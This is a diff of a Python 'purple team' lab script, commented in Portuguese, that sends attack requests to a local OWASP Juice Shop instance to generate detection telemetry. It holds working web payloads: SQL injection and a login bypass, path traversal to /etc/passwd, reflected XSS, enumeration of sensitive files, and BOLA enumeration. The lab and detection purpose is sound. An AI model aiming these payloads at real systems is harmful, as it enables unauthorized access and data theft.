@@ -1,35 +1,45 @@
-import urllib.request
-import urllib.parse
-import urllib.error
 import time
+import requests
 
-BASE_URL = "http://localhost:3000"
+TARGET = "http://localhost:3000"
 
-sqli_payload = urllib.parse.quote("'OR'1'='1")
+def run_attack_suite():
+    session = requests.Session()
 
-PAYLOADS = [
-    (f"/rest/products/search?q={sqli_payload}", "SQL Injection - Product Search"),
-    ("/rest/user/login", "SQL Injection - Login Bypass"),
-    ("/public/images/../../../../etc/passwd", "Path Traversal"),
-    ("/admin", "Directory Enumeration - Admin"),
-    ("/.env", "Directory Enumeration - Sensitive File"),
-    ("/db_backup", "Directory Enumeration - Backup")
-]
+    print("[*] Iniciando Bateria de Simulação Purple Team...")
 
-def run_attack():
-    print("[*] Iniciando simulação de ataques contra o Juice Shop...\n")
-    for endpoint, attack_type in PAYLOADS:
-        url = f"{BASE_URL}{endpoint}"
-        print(f"[+] Testando: {attack_type} -> {url}")
-        try:
-            req = urllib.request.Request(url, headers={'User-Agent': 'PurpleTeam-Lab-Scanner'})
-            with urllib.request.urlopen(req) as response:
-                print(f"    Status: {response.status}")
-        except urllib.error.HTTPError as e:
-            print(f"    Status: {e.code} (Capturado nos logs)")
-        except Exception as e:
-            print(f"    Erro na conexão: {e}")
-        time.sleep(1)
+    # 1. SQL Injection (T1190)
+    print("  [>] Executando SQLi em busca de produtos...")
+    session.get(f"{TARGET}/rest/products/search?q=' OR 1=1--")
+
+    print("  [>] Executando SQLi Auth Bypass...")
+    session.post(f"{TARGET}/rest/user/login", json={
+        "email": "admin@juice-sh.op' OR 1=1--",
+        "password": "pwned"
+    })
+
+    # 2. Path Traversal (T1083)
+    print("  [>] Executando Directory/Path Traversal...")
+    session.get(f"{TARGET}/public/images/ftp/../../../../etc/passwd")
+    session.get(f"{TARGET}/ftp/..%2f..%2f..%2fetc/passwd")
+
+    # 3. Cross-Site Scripting - XSS (T1059.007)
+    print("  [>] Executando Reflected XSS...")
+    session.get(f"{TARGET}/rest/products/search?q=<script>alert(1)</script>")
+    session.get(f"{TARGET}/rest/products/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E")
+
+    # 4. Reconnaissance & Enumeration (T1595.003)
+    print("  [>] Executando Enumeração de Diretórios e Arquivos Sensíveis...")
+    wordlist = ["/.env", "/admin", "/backup", "/.git/config", "/package.json.bak", "/server.js"]
+    for path in wordlist:
+        session.get(f"{TARGET}{path}")
+
+    # 5. Broken Object Level Authorization - BOLA (API1:2023)
+    print("  [>] Executando Enumeração BOLA em Cestas de Usuários...")
+    for basket_id in range(1, 5):
+        session.get(f"{TARGET}/rest/basket/{basket_id}")
+
+    print("[+] Simulação concluída. Telemetria gerada no OWASP Juice Shop.")
 
 if __name__ == "__main__":
-    run_attack()
+    run_attack_suite()
